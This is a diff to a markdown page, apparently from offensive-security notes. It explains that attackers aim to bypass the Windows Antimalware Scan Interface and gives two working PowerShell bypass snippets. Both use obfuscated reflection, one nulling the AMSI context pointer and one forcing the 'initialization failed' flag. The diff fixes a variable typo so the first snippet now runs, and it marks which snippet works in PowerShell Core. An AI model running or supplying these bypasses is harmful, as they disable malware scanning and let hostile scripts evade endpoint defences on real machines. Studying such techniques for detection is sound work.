@@ -13,19 +13,21 @@ When a script is executed in a supported environment (e.g., a PowerShell script)
 
 Because of this, a key goal for attackers is to bypass AMSI.
 
-### Example
+### PowerShell Example(s)
 ---
 
-- Example Bypass #1: Telling AMSI that initialization failed. (working)
+- **Example Bypass #1**: Setting AMSI context to null.
 ```powershell
-# Disable AMSI in the current session (doesn't work in PowerShell Core)
-$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ailed*"}}}
-$Var.SetValue($NULL,$TRUE)
+# Works in both PowerShell and PowerShell Core
+$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ontext"}}}
+[IntPtr]$Ptr=$Var.GetValue($NULL); [Int32[]]$Buff=@(0)
+[System.Runtime.InteropServices.Marshal]::Copy($Buff, 0, $Ptr, 1)
 ```
 
-- Example Bypass #2: Setting AMSI context to null (stopped working)
+
+- **Example Bypass #2**: Telling AMSI that initialization failed.
 ```powershell
-$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ontext"}}}
-[IntPtr]$Ptr=$Var.GetValue($NULL); [Int32[]]$Buf=@(0)
-[System.Runtime.InteropServices.Marshal]::Copy($Buff, 0, $Ptr, 1)
+# Does not work in PowerShell Core
+$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ailed*"}}}
+$Var.SetValue($NULL,$TRUE)
 ```
